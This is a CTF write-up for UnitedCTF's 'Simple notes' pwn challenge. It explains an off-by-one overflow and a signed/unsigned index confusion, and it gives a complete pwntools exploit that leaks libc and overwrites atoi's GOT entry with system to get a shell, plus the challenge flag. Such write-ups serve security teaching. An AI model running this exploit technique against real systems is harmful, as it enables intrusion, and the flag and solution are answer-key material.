# Simple notes

![alt logo](./logo.png)

## Description

Category : pwn<br>
Points : 400

I needed a way to take quick notes on the command line. I might have missed something...

## Analysis 
This is a simple notes program, we can create/read/delete/edit simple notes. The first bug is is commonly refered to as "off by one" error.
The program is reserving memory for 256 notes but it starts to count from -1
allowing us to create 257 notes.
```c
#define MAX_NOTES   256
.
.
void create_note() {
    unsigned int size;
    int current;
    if (notebook.current < MAX_NOTES) {
        current = notebook.current + 1;
.
.
notebook.current = -1;
.
.
```
The "importance" variable in note257 will overwrite the "current" variable (the notes count) that is located directly after note256. 
So we have total control on the "current" variable<br>
```c
typedef struct Note {
    int importance;
    char *content;
}Note;

typedef struct Notebook {
    Note notes[MAX_NOTES];
    int current;
}Notebook;
```
The second bug is the type confusion. By setting "current" to -3, it will be incremented by 1 setting is to -2.
The "current" variable's type is "int" but the "index" variable type is "unsigned int", so the program is tricked to treat the "current" variable as "unsigned int", now instead of comparing the index to the signed value of 0xffffffff which is -1, it will compare the index to the unsigned value of 0xffffffff which is 4294967295. So we can enter any index number (negative or positive) and it will always be less than 4294967295 (0xffffffff).
```c
int read_index() {
    printf("Index: ");
    unsigned int index = read_int();
    if (index >= notebook.current+1) {
        puts("Invalid index");
        return -1;
    }
    return index;
}
```
## Solution
First we create 256 notes, then we overwrite the current variable by creating the 257 note and giving it importance value of -3,
then we leak puts address from got.plt by reading note at index -8, calculate libc system address based on the offset, then 
overwrite atoi got.plt entry with system address by editing the note at index -6 and setting its importance to system address
then we pop a shell by setting the size field to "/bin/sh".

## Exploit
```python
#!/usr/bin/env python3

from pwn import *
import ctypes

exe = ELF("./simple_notes")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.terminal = ['st']

def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("challenges.unitedctf.ca", 1234)

def create_note(io, imp, size, data):
    io.recvuntil("> ")
    io.sendline("1")
    io.recvuntil("Importance: ")
    io.sendline(str(imp))
    io.recvuntil("Size: ")
    io.sendline(str(size))
    io.sendline(data)

def read_note(io, idx):
    io.recvuntil("> ")
    io.sendline("3")
    io.recvuntil("Index: ")
    io.sendline(str(idx))

def edit_note(io, idx, imp, size):
    io.recvuntil("> ")
    io.sendline("4")
    io.recvuntil("Index: ")
    io.sendline(str(idx))
    io.recvuntil("Importance: ")
    io.sendline(str(imp))
    io.recvuntil("Size: ")
    io.sendline(str(size))

def main():
    r = conn()

    # overwriting current variable with 0xffffffff to bypass the index check
    for i in range(256):
        create_note(r, i, 9, "asdf")
        log.info(f"Creating note number: {i}")
    create_note(r, -3, 9, "asdf")

    # leaking libc address
    read_note(r, -8)
    r.recvuntil("Importance: ")
    libc.address = int(r.recvline(keepends=False)) - libc.sym.puts
    log.info(f"Leaking libc address : {hex(libc.address)}")

    #overwriting the got entry for atoi to system
    edit_note(r, -6, ctypes.c_int32(libc.sym.system).value, "/bin/sh\0")

    r.interactive()

if __name__ == "__main__":
    main()
```

## Flag
```
FLAG-b21f3c6ea1d1edd90800f802e73d839f
```

[Unitedctf's write-ups and challenges files](https://github.com/UnitedCTF/UnitedCTF-2021)
